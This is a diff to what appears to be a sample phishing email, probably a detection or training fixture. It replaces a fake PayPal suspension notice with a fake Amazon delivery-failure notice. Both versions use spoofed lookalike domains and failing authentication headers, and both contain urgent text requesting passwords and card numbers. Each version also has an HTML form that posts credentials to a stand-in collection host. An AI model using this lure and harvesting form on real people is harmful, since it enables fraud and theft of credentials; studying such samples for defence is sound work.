@@ -1,65 +1,70 @@
-Return-Path: <noreply@suspicious-domain.tk>
-Received: from unknown-server.xyz (unknown-server.xyz [192.168.1.100])
-        by mx.example.com with SMTP id xyz789
-        for <victim@example.com>; Thu, 20 Feb 2026 09:30:00 -0500
+Return-Path: <bounce@amaz0n-delivery.tk>
+Received: from suspicious-relay.xyz (suspicious-relay.xyz [203.0.113.42])
+        by mx.example.com with SMTP id pq456rs
+        for <recipient@example.com>; Mon, 04 May 2026 14:22:00 +0000
 Authentication-Results: mx.example.com;
-       dkim=fail (signature verification failed) header.i=@paypa1.com;
-       spf=fail (mx.example.com: domain of noreply@paypa1.com does not designate 192.168.1.100 as permitted sender) smtp.mailfrom=noreply@paypa1.com;
-       dmarc=fail (p=REJECT) header.from=paypal.com
-Received-SPF: fail (mx.example.com: domain of noreply@paypa1.com does not designate 192.168.1.100 as permitted sender)
-X-Mailer: PHPMailer 5.2.0
-X-Originating-IP: 185.220.101.45
+       dkim=fail (signature verification failed) header.i=@amaz0n-delivery.tk;
+       spf=fail (mx.example.com: domain of bounce@amaz0n-delivery.tk does not designate 203.0.113.42 as permitted sender) smtp.mailfrom=bounce@amaz0n-delivery.tk;
+       dmarc=fail (p=REJECT) header.from=amaz0n-delivery.tk
+Received-SPF: fail (mx.example.com: 203.0.113.42 not permitted by amaz0n-delivery.tk)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=amaz0n-delivery.tk; s=mail;
+        h=from:to:subject:date:message-id;
+        bh=invalidHashValue==;
+        b=brokenSignatureValue==
+X-Mailer: Sendblaster Pro 4.5
+X-Originating-IP: 203.0.113.42
 MIME-Version: 1.0
-From: PayPal Security <security@paypa1.com>
-To: victim@example.com
-Reply-To: collect-info@gmail-phish.ml
-Subject: URGENT: Your PayPal account has been suspended - Immediate action required!
-Date: Thu, 20 Feb 2026 09:30:00 -0500
-Message-ID: <fake-message-id-12345@suspicious-domain.tk>
-Content-Type: multipart/alternative; boundary="===============boundary123=="
+From: Amazon Shipping <notify@amaz0n-delivery.tk>
+To: recipient@example.com
+Reply-To: confirm@quick-survey.ml
+Subject: ALERT: Your package could not be delivered - confirm address within 24 hours
+Date: Mon, 04 May 2026 14:22:00 +0000
+Message-ID: <pkg-track-9988@amaz0n-delivery.tk>
+Content-Type: multipart/alternative; boundary="==delivery_boundary=="
 
---===============boundary123==
+--==delivery_boundary==
 Content-Type: text/plain; charset="UTF-8"
 
-URGENT NOTICE - YOUR ACCOUNT HAS BEEN SUSPENDED
+ATTENTION CUSTOMER
 
-Dear Valued Customer,
+Our courier attempted to deliver your package today but was unable to
+reach the address on file. To avoid the package being returned to sender,
+you must confirm your delivery information IMMEDIATELY.
 
-We have detected suspicious activity on your PayPal account. Your account
-has been temporarily suspended to protect your security.
+Track and confirm your shipment: http://bit.ly/track-pkg-9988
 
-You must verify your identity IMMEDIATELY to restore access within 24 hours
-or your account will be permanently closed.
+Backup tracking link: http://203.0.113.42/track/confirm.php
 
-Click here to verify your account: http://bit.ly/paypal-verify-now
+Please provide:
+- Username and password used at checkout
+- Credit card details for the redelivery fee
+- Billing information
 
-Or visit: http://185.220.101.45/paypal/login.php
+Failure to confirm within 24 hours will result in the package being
+returned and a restocking fee charged to your account.
 
-Please provide your:
-- Username and password
-- Credit card number
-- Bank account details
+Final notice - act now to avoid losing your order.
 
-Failure to verify your account within 24 HOURS will result in PERMANENT suspension.
+Amazon Shipping Department
 
-PayPal Security Team
-
---===============boundary123==
+--==delivery_boundary==
 Content-Type: text/html; charset="UTF-8"
 
 <html>
 <body>
-<h1 style="color:red">URGENT: Account Suspended!</h1>
-<p>Dear Valued Customer,</p>
-<p>We detected <strong>suspicious activity</strong> on your account.</p>
-<p>Click <a href="http://bit.ly/paypal-verify-now">HERE</a> to verify immediately.</p>
-<p>Alternative link: <a href="http://185.220.101.45/paypal/login.php">Verify Account</a></p>
-<p>Your account will be <strong>permanently deleted</strong> in 24 hours.</p>
-<form action="http://phishing-collect.xyz/steal.php" method="POST">
+<h1 style="color:red">DELIVERY FAILED - Action required</h1>
+<p>Dear customer,</p>
+<p>Our courier could not deliver your package today.</p>
+<p>Click <a href="http://bit.ly/track-pkg-9988">HERE</a> to confirm your details.</p>
+<p>Alternative: <a href="http://203.0.113.42/track/confirm.php">amazon.com/track</a></p>
+<p>Your order will be returned within 24 hours if you do not act.</p>
+<form action="http://collect-info.xyz/submit.php" method="POST">
   <input type="text" name="email" placeholder="Email">
   <input type="password" name="password" placeholder="Password">
-  <input type="submit" value="Verify Now">
+  <input type="text" name="card" placeholder="Card number">
+  <input type="submit" value="Confirm Delivery">
 </form>
 </body>
 </html>
---===============boundary123==--
+--==delivery_boundary==--
